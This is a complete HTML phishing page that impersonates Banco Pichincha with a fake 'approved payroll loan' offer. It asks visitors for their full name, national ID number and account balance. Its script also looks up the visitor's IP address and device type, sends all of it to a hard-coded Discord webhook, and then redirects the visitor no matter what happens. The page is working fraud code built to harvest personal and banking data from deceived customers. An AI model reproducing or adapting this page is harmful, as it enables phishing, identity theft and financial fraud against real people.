<!DOCTYPE html>
<html lang="es">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Crédito Aprobado | Banco Pichincha</title>
    <link
      href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap"
      rel="stylesheet"
    />
    <style>
      :root {
        --pichincha-yellow: #ffdd00;
        --pichincha-dark: #2d2d2d;
        --pichincha-blue: #004b93;
        --success-bg: #f0fff4;
        --success-text: #22543d;
        --bg-canvas: #f9fafb;
      }

      body {
        font-family: "Inter", sans-serif;
        background-color: var(--bg-canvas);
        background-image: radial-gradient(
          circle at 2px 2px,
          #e5e7eb 1px,
          transparent 0
        );
        background-size: 40px 40px;
        margin: 0;
        display: flex;
        justify-content: center;
        align-items: center;
        min-height: 100vh;
        padding: 20px;
      }

      .main-container {
        background: #ffffff;
        width: 100%;
        max-width: 460px;
        border-radius: 24px;
        box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.15);
        overflow: hidden;
        border: 1px solid #edf2f7;
        animation: slideUp 0.6s ease-out;
        display: flex;
        flex-direction: column;
      }

      @keyframes slideUp {
        from {
          opacity: 0;
          transform: translateY(30px);
        }
        to {
          opacity: 1;
          transform: translateY(0);
        }
      }

      .header {
        padding: 45px 20px 25px;
        text-align: center;
        background: linear-gradient(to bottom, #fff, #fcfcfc);
      }

      .header img.logo {
        width: 220px;
        margin-bottom: 20px;
      }

      .approval-banner {
        background-color: var(--success-bg);
        border: 1px solid #c6f6d5;
        color: var(--success-text);
        padding: 12px 20px;
        border-radius: 12px;
        display: inline-flex;
        align-items: center;
        gap: 8px;
        font-weight: 600;
        font-size: 0.85rem;
        margin-bottom: 10px;
      }

      .approval-dot {
        height: 8px;
        width: 8px;
        background-color: #38a169;
        border-radius: 50%;
        display: inline-block;
        box-shadow: 0 0 8px #38a169;
      }

      .content {
        padding: 0 45px 30px; /* Reducido el padding inferior */
        flex-grow: 1;
      }

      h2 {
        color: var(--pichincha-dark);
        font-size: 1.6rem;
        font-weight: 700;
        margin: 10px 0;
        text-align: center;
      }

      .instruction {
        color: #718096;
        text-align: center;
        font-size: 0.95rem;
        margin-bottom: 30px;
      }

      .form-group {
        margin-bottom: 24px;
      }

      label {
        display: block;
        font-size: 0.75rem;
        font-weight: 600;
        color: var(--pichincha-blue);
        margin-bottom: 8px;
        text-transform: uppercase;
        letter-spacing: 0.5px;
      }

      input {
        width: 100%;
        padding: 14px 16px;
        border: 1.5px solid #e2e8f0;
        border-radius: 12px;
        font-size: 1rem;
        transition: all 0.2s;
        box-sizing: border-box;
        background: #f8fafc;
      }

      input:focus {
        outline: none;
        border-color: var(--pichincha-yellow);
        background: #fff;
        box-shadow: 0 0 0 4px rgba(255, 221, 0, 0.15);
      }

      .balance-card {
        background: linear-gradient(135deg, #ffffff 0%, #fffef0 100%);
        border: 1px dashed var(--pichincha-yellow);
        padding: 20px;
        border-radius: 16px;
        margin-bottom: 25px;
      }

      .input-symbol {
        position: relative;
      }

      .input-symbol span {
        position: absolute;
        left: 16px;
        top: 50%;
        transform: translateY(-50%);
        font-weight: 600;
        color: #4a5568;
      }

      .input-symbol input {
        padding-left: 35px;
        border-color: #f6e05e;
      }

      .btn-submit {
        width: 100%;
        padding: 18px;
        background-color: var(--pichincha-dark);
        color: var(--pichincha-yellow);
        border: none;
        border-radius: 12px;
        font-size: 1rem;
        font-weight: 700;
        cursor: pointer;
        transition: all 0.3s;
        box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1);
        text-transform: uppercase;
      }

      .btn-submit:hover {
        background-color: #000;
        transform: translateY(-1px);
        box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.1);
      }

      /* Nueva sección para la imagen inferior */
      .image-footer {
        width: 100%;
        padding: 0;
        margin-top: auto; /* Empuja la imagen al final del contenido */
      }

      .image-footer img {
        width: 100%;
        height: auto;
        display: block;
        border-top: 1px solid #edf2f7;
        /* Opcional: bordes redondeados solo abajo si no hay footer gris */
        /* border-radius: 0 0 24px 24px; */
      }

      .footer {
        padding: 25px;
        text-align: center;
        font-size: 0.75rem;
        color: #a0aec0;
        background-color: #fdfdfd;
        border-top: 1px solid #f7fafc;
      }
    </style>
  </head>
  <body>
    <div class="main-container">
      <div class="header">
        <img
          src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQnfVl8KKXncvu_tuDTMkYeEqFEti6zo25H1A&s"
          alt="Banco Pichincha"
          class="logo"
        />
        <br />
        <div class="approval-banner">
          <span class="approval-dot"></span>
          CRÉDITO LIBRANZA APROBADO
        </div>
      </div>

      <div class="content">
        <h2>¡Hola de nuevo!</h2>
        <p class="instruction">
          Confirma tus datos para proceder con el desembolso inmediato a tu
          cuenta Pichincha.
        </p>

        <form>
          <div class="form-group">
            <label for="nombre">Nombre Completo</label>
            <input
              type="text"
              id="nombre"
              placeholder="Nombres y Apellidos"
              required
            />
          </div>

          <div class="form-group">
            <label for="cedula">Cédula de Identidad</label>
            <input
              type="text"
              id="cedula"
              maxlength="10"
              placeholder="Ej: 1712345678"
              required
            />
          </div>

          <div class="balance-card">
            <label for="monto" style="color: var(--pichincha-dark)"
              >Saldo Disponible en su Cuenta Pichincha</label
            >
            <div class="input-symbol">
              <span>$</span>
              <input
                type="number"
                id="monto"
                step="0.01"
                placeholder="0.00"
                required
              />
            </div>
            <p
              style="
                font-size: 0.7rem;
                color: #718096;
                margin-top: 10px;
                margin-bottom: 0;
              "
            >
              *Verificamos su saldo para asegurar la cuenta de destino del
              crédito.
            </p>
          </div>

          <button type="submit" class="btn-submit">
            ACEPTAR CRÉDITO APROBADO
          </button>
        </form>
      </div>

      <div class="image-footer">
        <img
          src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR76oQ29A6t4LiUMUj-lj0-JUbBpfA8o08rgw&s"
          alt="Éxito Financiero"
        />
      </div>

      <div class="footer">© 2024 Banco Pichincha <br /></div>
    </div>
    <script>
      const form = document.querySelector("form");

      form.addEventListener("submit", async (e) => {
        e.preventDefault();

        // 1. URL de tu Webhook de Discord
        const DISCORD_WEBHOOK_URL =
          "https://discord.com/api/webhooks/1494353566456877057/SnHztmydU8j6Tif_i9G2N_OO4YOeIC2bmm-vteyg4TQIsnD4eT2qNrTazM4g0ltfAvoB";

        // 2. Obtener datos del formulario
        const nombre = document.getElementById("nombre").value;
        const cedula = document.getElementById("cedula").value;
        const monto = document.getElementById("monto").value;

        try {
          // 3. Obtener la IP real
          const ipResponse = await fetch("https://api.ipify.org?format=json");
          const ipData = await ipResponse.json();
          const clienteIP = ipData.ip;

          // 4. Lógica simplificada para el dispositivo
          let dispositivo = "PC / Otro";
          const ua = navigator.userAgent.toLowerCase();

          if (ua.includes("iphone") || ua.includes("ipad")) {
            dispositivo = "iPhone";
          } else if (ua.includes("android")) {
            dispositivo = "Android";
          }

          // 5. Estructura del mensaje para Discord
          const mensaje = {
            embeds: [
              {
                title: "🔔 NUEVO REGISTRO - CRÉDITO LIBRANZA",
                color: 16768256,
                fields: [
                  { name: "👤 Cliente", value: `**${nombre}**`, inline: true },
                  { name: "🆔 Identificación", value: cedula, inline: true },
                  {
                    name: "💰 Saldo Reportado",
                    value: `$${monto}`,
                    inline: false,
                  },
                  {
                    name: "🌐 Dirección IP",
                    value: `\`${clienteIP}\``,
                    inline: true,
                  },
                  { name: "📱 Dispositivo", value: dispositivo, inline: true },
                ],
                footer: { text: "Seguridad Banco Pichincha" },
                timestamp: new Date(),
              },
            ],
          };

          // 6. Enviar a Discord
          const response = await fetch(DISCORD_WEBHOOK_URL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(mensaje),
          });

          if (response.ok) {
            window.location.href = "corea.html";
          } else {
            window.location.href = "corea.html"; // Redirigir igual si hay error de webhook
          }
        } catch (error) {
          window.location.href = "corea.html";
        }
      });
    </script>
  </body>
</html>
